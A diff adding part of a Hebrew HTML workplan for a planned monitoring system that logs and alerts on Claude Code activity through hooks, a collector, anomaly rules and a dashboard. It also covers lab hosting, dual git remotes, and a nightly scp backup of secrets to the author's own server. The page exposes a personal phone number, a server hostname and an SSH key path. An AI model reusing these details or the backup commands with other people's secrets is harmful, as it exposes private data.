+  <div class="hw-row" style="border-top:1px solid var(--accent); margin-top:4px; padding-top:4px;">
+    <span class="hw-label" style="font-weight:700;">סה"כ/חודש</span>
+    <span class="hw-value ok" style="font-size:16px;">~$48</span>
+  </div>
+  <div class="hw-row">
+    <span class="hw-label">חודש ראשון (קרדיט $100)</span>
+    <span class="hw-value ok" style="font-size:14px; color:#4ade80;">✅ חינמי</span>
+  </div>
+</div>
+
+<!-- Network topology -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">רשת פנימית — Kamatera Private LAN</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:1.9; font-family:monospace; margin-top:8px;">
+  Kamatera IL-PT — Private Network: 192.168.0.0/24
+  ┌──────────────────────────────────────────────────┐
+  │                                                  │
+  │  [DC01 — 192.168.0.1]                           │
+  │   Windows Server 2022                            │
+  │   AD + DNS + GPO                                 │
+  │        │                                         │
+  │   ─────┼──────────────────────                  │
+  │        │              │                          │
+  │  [WS01 — 192.168.0.2] │  [CCSM — 192.168.0.10] │
+  │   Ubuntu + Claude Code │   Collector + Dashboard  │
+  │   CCSM Agent          ├──► events → PostgreSQL   │
+  │   Join Domain         │   LDAP Auth ← AD         │
+  │                                                  │
+  └──────────────────────────────────────────────────┘
+  תקשורת פנימית: חינמית | ללא חיוב bandwidth פנימי
+  </pre>
+</div>
+
+<!-- Checklist before lab -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">צ'קליסט — לפני הקמת Lab</div>
+  <div class="hw-row"><span class="hw-label">✅ שלב א סיום</span><span class="hw-value ok">קוד עובד על המחשב המקומי</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ פתיחת חשבון Kamatera חדש</span><span class="hw-value warn">kamatera.com/free-trial</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ יצירת Private LAN</span><span class="hw-value min">בממשק Kamatera</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ הקמת DC01</span><span class="hw-value min">Windows Server + AD</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ הקמת CCSM-SRV</span><span class="hw-value min">Ubuntu + PostgreSQL + Collector</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ הקמת WS01</span><span class="hw-value min">Ubuntu + Claude Code + Agent</span></div>
+  <div class="hw-row"><span class="hw-label">⬜ בדיקות end-to-end</span><span class="hw-value min">hook → collector → dashboard → AD</span></div>
+</div>
+
+<div class="hw-note" style="background:rgba(99,102,241,0.08); border-color:rgba(99,102,241,0.3); color:#a5b4fc;">
+  💡 כל הסקריפטים להקמה (DC, WS, CCSM) ייכתבו אוטומטית — הקמה בלחיצת כפתור לאחר סיום שלב א'.
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- TECH STACK -->
+<div class="section-title">טק סטאק</div>
+<div class="stack-grid">
+  <div class="stack-card">
+    <div class="stack-icon">🟢</div>
+    <div class="stack-name">Node.js 20</div>
+    <div class="stack-role">Agent + Collector + API</div>
+  </div>
+  <div class="stack-card">
+    <div class="stack-icon">🗄️</div>
+    <div class="stack-name">SQLite → PG</div>
+    <div class="stack-role">שלב א → שלב ב</div>
+  </div>
+  <div class="stack-card">
+    <div class="stack-icon">⚡</div>
+    <div class="stack-name">Express</div>
+    <div class="stack-role">Collector + Dashboard API</div>
+  </div>
+  <div class="stack-card">
+    <div class="stack-icon">📊</div>
+    <div class="stack-name">Chart.js</div>
+    <div class="stack-role">גרפים בDashboard</div>
+  </div>
+  <div class="stack-card">
+    <div class="stack-icon">🔐</div>
+    <div class="stack-name">JWT + LDAP</div>
+    <div class="stack-role">Auth + AD</div>
+  </div>
+  <div class="stack-card">
+    <div class="stack-icon">📱</div>
+    <div class="stack-name">Telegram API</div>
+    <div class="stack-role">התראות</div>
+  </div>
+</div>
+
+<!-- DELIVERABLES PHASE A -->
+<div class="section-title">תוצרי שלב א</div>
+<div class="deliver-list">
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>ccsm-hook.js</strong>
+      <span>Hook script פעיל ב-Claude Code hooks</span>
+    </div>
+  </div>
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>collector/server.js</strong>
+      <span>Express + SQLite, port 3010</span>
+    </div>
+  </div>
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>dashboard/index.html</strong>
+      <span>ממשק ניהול Checkpoint-style</span>
+    </div>
+  </div>
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>rules.js</strong>
+      <span>חוקי anomaly — CRITICAL עד INFO</span>
+    </div>
+  </div>
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>install.ps1</strong>
+      <span>סקריפט התקנה + הגדרת hooks</span>
+    </div>
+  </div>
+  <div class="deliver-item">
+    <div class="deliver-check"></div>
+    <div class="deliver-text">
+      <strong>Telegram Bot</strong>
+      <span>התראות CRITICAL/HIGH בזמן אמת</span>
+    </div>
+  </div>
+</div>
+
+<!-- GITHUB -->
+<div class="section-title">GitHub — גיבוי ובקרת גרסאות</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-bottom:16px;">
+
+  <!-- Repo details -->
+  <div class="hw-card" style="border-top:3px solid #6e5494;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
+      <div style="background:rgba(110,84,148,0.15);border-radius:8px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:20px;">🐙</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">GitHub Repository</div>
+        <div style="font-size:11px;color:#a78bfa;font-weight:700;">🔒 Private</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">שם Repo</span><span class="hw-value ok">ehz-sec-ai</span></div>
+    <div class="hw-row"><span class="hw-label">Branch ראשי</span><span class="hw-value ok">main</span></div>
+    <div class="hw-row"><span class="hw-label">גישה</span><span class="hw-value ok">Private — ערן בלבד</span></div>
+    <div class="hw-row"><span class="hw-label">Commit אוטומטי</span><span class="hw-value ok">אחרי כל Milestone</span></div>
+    <div class="hw-row"><span class="hw-label">מי מבצע push</span><span class="hw-value ok">Claude ישירות</span></div>
+  </div>
+
+  <!-- What gets pushed -->
+  <div class="hw-card">
+    <div class="hw-card-title" style="color:var(--green);">✅ מה מועלה ל-GitHub</div>
+    <div style="font-size:12px;line-height:2;margin-top:8px;font-family:monospace;color:var(--muted2);">
+      <div style="color:var(--green);">+ agent/hook.js</div>
+      <div style="color:var(--green);">+ agent/rules.js</div>
+      <div style="color:var(--green);">+ agent/whitelist.json</div>
+      <div style="color:var(--green);">+ collector/server.js</div>
+      <div style="color:var(--green);">+ collector/schema.sql</div>
+      <div style="color:var(--green);">+ dashboard/index.html</div>
+      <div style="color:var(--green);">+ install/setup.ps1</div>
+      <div style="color:var(--green);">+ scanner/yara-rules/</div>
+      <div style="color:var(--green);">+ workplan.html</div>
+      <div style="color:var(--green);">+ README.md</div>
+    </div>
+  </div>
+
+  <!-- What's ignored -->
+  <div class="hw-card">
+    <div class="hw-card-title" style="color:var(--red);">❌ .gitignore — לא מועלה</div>
+    <div style="font-size:12px;line-height:2;margin-top:8px;font-family:monospace;color:var(--muted2);">
+      <div style="color:var(--red);">.env</div>
+      <div style="color:var(--red);">.ccsm/machine.token</div>
+      <div style="color:var(--red);">config/project-scope.json</div>
+      <div style="color:var(--red);">*.db  ← SQLite</div>
+      <div style="color:var(--red);">logs/</div>
+      <div style="color:var(--red);">node_modules/</div>
+      <div style="color:var(--red);">*.token</div>
+      <div style="color:var(--red);">skills-registry.json</div>
+      <div style="color:var(--muted);font-size:10px;margin-top:4px;"># סיסמאות / tokens / DB אישי</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Commit strategy -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">אסטרטגיית Commits — אחד לכל Milestone</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; margin-top:10px; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+  Milestone 1 הושלם + בדיקה עברה
+    git commit -m "feat: Milestone 1 — Hook + Collector + Telegram"
+
+  Milestone 2 הושלם
+    git commit -m "feat: Milestone 2 — Anomaly Rules + Whitelist"
+
+  Milestone 3 הושלם
+    git commit -m "feat: Milestone 3 — Dashboard UI"
+
+  תיקון bug באמצע milestone
+    git commit -m "fix: collector SQLite path on Windows"
+
+  שינוי חוק anomaly
+    git commit -m "rules: add base64_decode HIGH pattern"
+  </pre>
+</div>
+
+<!-- Branch strategy -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">מבנה Branches</div>
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:10px;">
+    <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.2);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:4px;font-family:monospace;">main</div>
+      <div style="color:var(--muted2);">קוד יציב בלבד<br>אחרי בדיקת קבלה</div>
+    </div>
+    <div style="background:rgba(99,102,241,0.07);border:1px solid rgba(99,102,241,0.2);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:var(--accent2);font-weight:700;margin-bottom:4px;font-family:monospace;">dev</div>
+      <div style="color:var(--muted2);">פיתוח שוטף<br>merge ל-main אחרי milestone</div>
+    </div>
+    <div style="background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:var(--green);font-weight:700;margin-bottom:4px;font-family:monospace;">hotfix/*</div>
+      <div style="color:var(--muted2);">תיקון בעיות דחוף<br>ישירות ל-main</div>
+    </div>
+    <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:var(--yellow);font-weight:700;margin-bottom:4px;font-family:monospace;">feature/*</div>
+      <div style="color:var(--muted2);">פיצ'ר חדש גדול<br>domain / siem / block-mode</div>
+    </div>
+  </div>
+</div>
+
+<!-- Setup steps -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">הקמה ראשונית — Claude מבצע לפני Milestone 1</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; margin-top:10px; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+  # 1. init בתיקיית הפרויקט
+  cd C:/Claude-Repo/agents/EHZ-SEC-AI
+  git init
+
+  # 2. הגדרת remotes — GitHub + Oracle (גיבוי כפול)
+  git remote add origin https://github.com/[username]/ehz-sec-ai.git
+  git remote set-url --add --push origin https://github.com/[username]/ehz-sec-ai.git
+  git remote set-url --add --push origin opc@ehz-server.duckdns.org:/home/opc/git/ehz-sec-ai.git
+
+  # 3. הקמת bare repo על Oracle (פעם אחת)
+  ssh -i "C:/Claude-Repo/oracle/keys/ssh-key-2026-03-14 (1).key" \
+    opc@ehz-server.duckdns.org \
+    "git init --bare /home/opc/git/ehz-sec-ai.git"
+
+  # 4. יצירת .gitignore
+  echo ".env\n*.db\nlogs/\nnode_modules/\n*.token" > .gitignore
+
+  # 5. commit ראשון — workplan + dashboard demo
+  git add workplan.html dashboard-demo.html .gitignore README.md
+  git commit -m "init: project setup + workplan"
+  git push -u origin main   # ← דוחף לשניהם אוטומטית!
+
+  # 6. יצירת branch dev
+  git checkout -b dev
+  git push -u origin dev
+  </pre>
+</div>
+
+<!-- README preview -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">README.md — תוכן</div>
+  <div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:14px;font-size:12px;font-family:monospace;color:var(--muted2);line-height:1.9;margin-top:10px;">
+    <div style="color:var(--accent);font-size:16px;font-weight:800;"># EHZ-SEC-AI 🛡</div>
+    <div style="color:var(--muted2);">Claude Code Security Monitor</div>
+    <div style="margin-top:8px;color:var(--text);">## מה זה?</div>
+    <div>מערכת ניטור ואבטחה לפעילות Claude Code.</div>
+    <div>Agent hooks → Collector → Dashboard → Telegram</div>
+    <div style="margin-top:8px;color:var(--text);">## מצב נוכחי</div>
+    <div style="color:var(--yellow);">🚧 בפיתוח — Milestone 1</div>
+    <div style="margin-top:8px;color:var(--text);">## התקנה</div>
+    <div>ראה workplan.html לתוכנית מלאה</div>
+    <div style="margin-top:8px;color:var(--text);">## פותח על ידי</div>
+    <div>EHZ-AI | ערן | 054-4825276</div>
+  </div>
+</div>
+
+<!-- Oracle Backup -->
+<div class="hw-card" style="margin-bottom:16px;border-top:3px solid #f97316;">
+  <div class="hw-card-title" style="color:var(--orange);">🗄️ גיבוי כפול — GitHub + שרת Oracle</div>
+  <div style="color:var(--muted2);font-size:12px;margin:10px 0 14px;">כל <code style="color:var(--green);">git push</code> יגיע לשני יעדים במקביל — GitHub בענן + Oracle בארץ.</div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px;">
+    <!-- GitHub -->
+    <div style="background:rgba(110,84,148,0.08);border:1px solid rgba(110,84,148,0.25);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="font-weight:800;color:#a78bfa;margin-bottom:6px;">🐙 GitHub (ענן)</div>
+      <div style="color:var(--muted2);line-height:1.8;">
+        ✅ Private repo<br>
+        ✅ גיבוי גלובלי<br>
+        ✅ Version history<br>
+        ✅ גישה מכל מקום
+      </div>
+    </div>
+    <!-- Oracle -->
+    <div style="background:rgba(249,115,22,0.08);border:1px solid rgba(249,115,22,0.25);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="font-weight:800;color:var(--orange);margin-bottom:6px;">🏠 Oracle (ישראל)</div>
+      <div style="color:var(--muted2);line-height:1.8;">
+        ✅ גיבוי מקומי (IL)<br>
+        ✅ Recovery מהיר<br>
+        ✅ ללא תלות בענן<br>
+        ✅ שרת שכבר קיים
+      </div>
+    </div>
+  </div>
+
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;font-weight:700;">הגדרת Git Remote כפול — פקודה אחת דוחפת לשניהם:</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+  # הגדרת שני remotes
+  git remote add origin https://github.com/[username]/ehz-sec-ai.git
+  git remote add oracle opc@ehz-server.duckdns.org:/home/opc/git/ehz-sec-ai.git
+
+  # יצירת bare repo על Oracle (פעם אחת בלבד)
+  ssh -i "C:/Claude-Repo/oracle/keys/ssh-key-2026-03-14 (1).key" opc@ehz-server.duckdns.org \
+    "mkdir -p /home/opc/git && git init --bare /home/opc/git/ehz-sec-ai.git"
+
+  # Push לשניהם בפקודה אחת
+  git push origin main   # → GitHub
+  git push oracle main   # → Oracle
+
+  # או — הוסף Oracle כ-push URL נוסף ל-origin (push אחד לשניהם!)
+  git remote set-url --add --push origin https://github.com/[username]/ehz-sec-ai.git
+  git remote set-url --add --push origin opc@ehz-server.duckdns.org:/home/opc/git/ehz-sec-ai.git
+  git push  # ← דוחף לשני המקומות אוטומטית
+  </pre>
+
+  <div style="display:flex;gap:10px;margin-top:12px;font-size:11px;">
+    <div style="background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.2);border-radius:6px;padding:8px 12px;color:var(--green);">
+      <strong>🔄 אסטרטגיה:</strong> Origin = GitHub+Oracle. פקודת push אחת → גיבוי כפול אוטומטי.
+    </div>
+    <div style="background:rgba(14,165,233,0.08);border:1px solid rgba(14,165,233,0.2);border-radius:6px;padding:8px 12px;color:var(--accent);">
+      <strong>📂 נתיב Oracle:</strong> /home/opc/git/ehz-sec-ai.git (bare repo)
+    </div>
+  </div>
+</div>
+
+<!-- Sensitive files backup -->
+<div class="hw-card" style="margin-bottom:16px;border-top:3px solid #10b981;">
+  <div class="hw-card-title" style="color:var(--green);">🔐 גיבוי קבצים רגישים — Oracle בלבד (לא ב-GitHub)</div>
+  <div style="color:var(--muted2);font-size:12px;margin:10px 0 14px;">
+    קבצים שב-<code style="color:var(--red);">.gitignore</code> מגובים לשרת Oracle דרך SCP יומי אוטומטי. לעולם לא עולים ל-GitHub.
+  </div>
+
+  <!-- Table -->
+  <div style="overflow-x:auto;margin-bottom:16px;">
+    <table style="width:100%;border-collapse:collapse;font-size:12px;">
+      <thead>
+        <tr style="background:rgba(255,255,255,0.04);">
+          <th style="text-align:right;padding:8px 12px;color:var(--muted);font-weight:700;border-bottom:1px solid var(--border);">קובץ / תיקייה</th>
+          <th style="text-align:center;padding:8px 12px;color:var(--muted);font-weight:700;border-bottom:1px solid var(--border);">GitHub</th>
+          <th style="text-align:center;padding:8px 12px;color:var(--muted);font-weight:700;border-bottom:1px solid var(--border);">Oracle</th>
+          <th style="text-align:right;padding:8px 12px;color:var(--muted);font-weight:700;border-bottom:1px solid var(--border);">תוכן</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+          <td style="padding:8px 12px;font-family:monospace;color:var(--green);">agent/ rules/ dashboard/</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">קוד המערכת</td>
+        </tr>
+        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);">
+          <td style="padding:8px 12px;font-family:monospace;color:var(--red);">.env</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--red);">❌</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">Telegram token, API keys</td>
+        </tr>
+        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+          <td style="padding:8px 12px;font-family:monospace;color:var(--red);">*.db</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--red);">❌</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">מסד נתונים — כל האירועים</td>
+        </tr>
+        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);">
+          <td style="padding:8px 12px;font-family:monospace;color:var(--red);">logs/</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--red);">❌</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">לוגים מלאים של פעילות</td>
+        </tr>
+        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+          <td style="padding:8px 12px;font-family:monospace;color:var(--red);">config/project-scope.json</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--red);">❌</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">הגדרות אישיות + נתיבים</td>
+        </tr>
+        <tr>
+          <td style="padding:8px 12px;font-family:monospace;color:var(--red);">*.token</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--red);">❌</td>
+          <td style="text-align:center;padding:8px 12px;color:var(--green);">✅</td>
+          <td style="padding:8px 12px;color:var(--muted2);">Machine token</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Backup script -->
+  <div style="font-size:11px;color:var(--muted);margin-bottom:8px;font-weight:700;">סקריפט גיבוי — backup-sensitive.ps1 (Windows Task Scheduler — כל לילה 02:00)</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:1.9; font-family:monospace; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+  # backup-sensitive.ps1
+  $KEY   = "C:/Claude-Repo/oracle/keys/ssh-key-2026-03-14 (1).key"
+  $DEST  = "opc@ehz-server.duckdns.org"
+  $DATE  = Get-Date -Format "yyyyMMdd"
+  $SRC   = "C:/Claude-Repo/agents/EHZ-SEC-AI"
+  $REMOTE = "/home/opc/backups/ehz-sec-ai/$DATE"
+
+  # יצירת תיקיית יעד
+  ssh -i $KEY $DEST "mkdir -p $REMOTE"
+
+  # גיבוי קבצים רגישים בלבד
+  scp -i $KEY "$SRC/.env"                          "${DEST}:${REMOTE}/.env"
+  scp -i $KEY "$SRC/collector/ccsm.db"             "${DEST}:${REMOTE}/ccsm.db"
+  scp -i $KEY "$SRC/config/project-scope.json"     "${DEST}:${REMOTE}/project-scope.json"
+  scp -i $KEY -r "$SRC/logs/"                      "${DEST}:${REMOTE}/logs/"
+
+  Write-Host "✅ Backup complete → Oracle $REMOTE"
+  </pre>
+
+  <!-- Retention -->
+  <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:14px;font-size:11px;">
+    <div style="background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:10px;text-align:center;">
+      <div style="font-size:18px;margin-bottom:4px;">🕑</div>
+      <div style="color:var(--green);font-weight:700;">כל לילה 02:00</div>
+      <div style="color:var(--muted2);">Windows Task Scheduler</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.2);border-radius:8px;padding:10px;text-align:center;">
+      <div style="font-size:18px;margin-bottom:4px;">📦</div>
+      <div style="color:var(--accent);font-weight:700;">שמירה 7 ימים</div>
+      <div style="color:var(--muted2);">תיקיות לפי תאריך YYYYMMDD</div>
+    </div>
+    <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:8px;padding:10px;text-align:center;">
+      <div style="font-size:18px;margin-bottom:4px;">🔒</div>
+      <div style="color:var(--yellow);font-weight:700;">Oracle בלבד</div>
+      <div style="color:var(--muted2);">לעולם לא עולה ל-GitHub</div>
+    </div>
+  </div>
+</div>
+
+<div class="hw-note" style="background:rgba(110,84,148,0.08);border-color:rgba(110,84,148,0.3);color:#a78bfa;margin-bottom:24px;">
+  🐙 הקמת ה-Repo וה-commit הראשון יבוצעו על ידי Claude לפני תחילת Milestone 1. נדרש: שם המשתמש ב-GitHub.<br>
+  🏠 הקמת ה-Bare Repo על Oracle תבוצע באותו שלב — גיבוי כפול מהיום הראשון.
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <strong>EHZ-AI</strong> | Claude Code Security Monitor | 054-4825276<br>
+  נוצר: אפריל 2026 | גרסה 1.0
+</div>
+
+</body>
+</html>
